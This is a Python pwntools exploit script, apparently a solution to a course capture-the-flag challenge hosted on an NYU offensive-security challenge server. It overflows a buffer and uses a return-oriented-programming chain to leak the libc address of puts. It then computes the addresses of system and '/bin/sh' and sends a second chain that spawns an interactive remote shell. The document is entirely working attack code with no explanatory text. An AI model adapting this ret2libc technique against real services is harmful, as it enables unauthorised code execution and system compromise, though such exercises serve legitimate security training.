from pwn import *
context.log_level = "debug"


buffer = "A" * 0x28
puts_ptr = 0x601018
puts = 0x4004c0
__libc_start_main = 0x601018
rdi_ret = 0x00000000004006b3 
system = 0x46593


chain = ""
#printing out puts in libc

e = ELF("libc-2.19.so")
system = e.symbols["system"]
binsh = 0x180503

chain += buffer

chain += p64(rdi_ret)
chain += p64(puts_ptr)
chain += p64(puts)
chain += p64(0x400621)

#p = process("./rop")
p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343)
p.sendline("svv232")
p.recvuntil("...")
p.recvuntil("ls")
p.sendline(chain)
p.recvline()
puts_libc = p.recvline()[:-1]
puts_libc += "\x00" * (8-len(puts_libc))


puts_libc = u64(puts_libc)
system = puts_libc - 0x6fd60 + system
print hex(system)
print hex(puts_libc - 0x6fd60)

binsh = puts_libc - 0x6fd60 + binsh

chain = ""
chain += "A" * 0x28
chain += p64(rdi_ret)
chain += p64(binsh)
chain += p64(system)

print chain

p.recvuntil("ls")
p.sendline(chain)
p.recvline()
p.interactive()
